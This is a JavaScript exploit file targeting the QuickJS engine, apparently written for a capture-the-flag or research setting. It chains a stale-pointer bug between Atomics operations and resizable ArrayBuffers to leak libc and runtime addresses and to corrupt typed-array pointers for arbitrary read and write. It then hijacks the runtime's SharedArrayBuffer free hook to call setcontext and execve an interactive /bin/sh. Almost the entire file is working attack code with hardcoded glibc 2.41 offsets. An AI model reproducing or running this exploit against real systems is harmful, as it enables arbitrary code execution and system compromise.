// QuickJS exploit: Atomics + Resizable ArrayBuffer stale pointer -> UAF/OOB
// Goal: execve("/bin/sh", ...) to spawn a shell reading stdin.

function u64(x) {
  if (typeof x === 'bigint') return x;
  throw new Error('expected BigInt');
}

// glibc 2.41 constants (from debug symbols / disassembly)
const MAIN_ARENA_OFF = 0x1e7ac0n;
const UNSORTED_BINS_OFF = 0x60n; // bin_at(main_arena, 1) (&main_arena.bins[0] - 0x10)
const SETCONTEXT_OFF = 0x453b0n;
const EXECVE_OFF = 0xdddd0n;

// Keep objects alive
const keep = [];

function leak_libc_base() {
  // Make remainder chunk go to unsorted: old=0x5000, new=0x20.
  const ab = new ArrayBuffer(0x5000, { maxByteLength: 0x6000 });
  const ta = new BigUint64Array(ab);
  const mal = {
    valueOf() {
      ab.resize(0x20);
      return 0n; // add 0 => don't perturb fd pointer
    },
  };
  // new_chunksz = align(0x20+0x10)=0x30, so remainder_user = old_user+0x30 => idx=6
  const leak = Atomics.add(ta, 6, mal);
  return leak - MAIN_ARENA_OFF - UNSORTED_BINS_OFF;
}

function leak_ctx_ptr() {
  // Force a JSFunctionBytecode allocation at runtime via new Function().
  // We shrink leaving a remainder chunk sized to fit JSFunctionBytecode.
  const ab = new ArrayBuffer(0x400, { maxByteLength: 0x800 });
  const ta = new BigUint64Array(ab);

  // Empirically reliable for this build: resize to 0x360 and read at idx=0x78
  // which corresponds to offset 0x50 inside the remainder chunk user area.
  const idx = 0x78;
  const mal = {
    valueOf() {
      ab.resize(0x360);
      // Allocate bytecode in the remainder chunk
      keep.push(new Function('return 1'));
      return 0n;
    },
  };
  return Atomics.add(ta, idx, mal);
}

function make_corrupt_bigu64(target_ptr, backing_buf) {
  // Corrupt a BigUint64Array JSObject allocated inside a realloc remainder
  // by overwriting its u.array.u.ptr field.
  const ab = new ArrayBuffer(0x400, { maxByteLength: 0x800 });
  const ta = new BigUint64Array(ab);

  // Important: use resize(0x3b0) (not 0x3a0) so the remainder chunk is sized
  // such that the JSObject allocation for BigUint64Array can come from it.
  // new_chunksz ~= 0x3c0, target field offset = new_chunksz + 56 => idx=0x7f.
  const idx = 0x7f;

  let view;
  const mal = {
    valueOf() {
      ab.resize(0x3b0);
      view = new BigUint64Array(backing_buf);
      return target_ptr;
    },
  };

  // exchange writes target_ptr and returns the old u.array.u.ptr (backing store addr)
  const old_ptr = Atomics.exchange(ta, idx, mal);
  return { view, backing_ptr: old_ptr };
}

function write_ucontext_and_rop(buf, buf_addr, libc_base) {
  // Prepare ucontext for setcontext(): set RIP=execve, RDI/RSi/RDX args.
  // Layout is based on glibc setcontext implementation (x86-64).
  const dv = new DataView(buf);
  function w64(off, val) { dv.setBigUint64(off, val, true); }
  function w32(off, val) { dv.setUint32(off, val, true); }
  function wstr(off, s) {
    for (let i = 0; i < s.length; i++) dv.setUint8(off + i, s.charCodeAt(i));
    dv.setUint8(off + s.length, 0);
  }

  const execve = libc_base + EXECVE_OFF;

  // Place strings/argv/stack within this buffer
  const off_fpu = 0x200;
  const off_argv = 0x330;
  const off_envp = 0x350;
  const off_binsh = 0x370;
  const off_dash_i = 0x378;
  const off_stack = 0x308; // rsp%16==8

  // strings
  wstr(off_binsh, '/bin/sh');
  wstr(off_dash_i, '-i');

  // argv: ["/bin/sh", "-i", NULL]
  w64(off_argv + 0, buf_addr + BigInt(off_binsh));
  w64(off_argv + 8, buf_addr + BigInt(off_dash_i));
  w64(off_argv + 16, 0n);

  // envp: NULL terminated array (single NULL)
  w64(off_envp + 0, 0n);

  // ucontext fields consumed by setcontext
  // gregs base is inside the ucontext blob itself; we only set what setcontext reads.
  w64(0xe0, buf_addr + BigInt(off_fpu)); // fldenv pointer
  w32(0x1c0, 0x1f80); // mxcsr (default)

  w64(0xa0, buf_addr + BigInt(off_stack)); // RSP
  w64(0xa8, execve); // RIP

  w64(0x68, buf_addr + BigInt(off_binsh)); // RDI = filename
  w64(0x70, buf_addr + BigInt(off_argv));  // RSI = argv
  w64(0x88, buf_addr + BigInt(off_envp));  // RDX = envp
}

(function main() {
  // Create the SharedArrayBuffer to be finalized later (during runtime cleanup).
  // Allocate it early so it is likely swept early, while our ucontext buffer
  // (allocated later) is still alive.
  keep.push(new SharedArrayBuffer(0x1000));

  const libc_base = leak_libc_base();
  const ctx = leak_ctx_ptr();

  // Corrupt a typed array to read rt pointer from ctx+0x18
  const backing_ctx = new ArrayBuffer(0x100);
  const mem_ctx = make_corrupt_bigu64(ctx, backing_ctx).view;
  const rt = mem_ctx[3];

  // Corrupt a typed array to get arbitrary write into rt.
  const backing_rt = new ArrayBuffer(0x400);
  const { view: mem_rt, backing_ptr: uc_addr } = make_corrupt_bigu64(rt, backing_rt);

  // Write ucontext into backing_rt's data (uc_addr)
  write_ucontext_and_rop(backing_rt, uc_addr, libc_base);

  const setcontext = libc_base + SETCONTEXT_OFF;

  // Patch rt->sab_funcs.sab_free and sab_opaque.
  // Offsets in JSRuntime: sab_free=0x180, sab_opaque=0x190.
  mem_rt[0x180 / 8] = setcontext;
  mem_rt[0x190 / 8] = uc_addr;

  // Trigger happens during runtime cleanup at script end.
})();
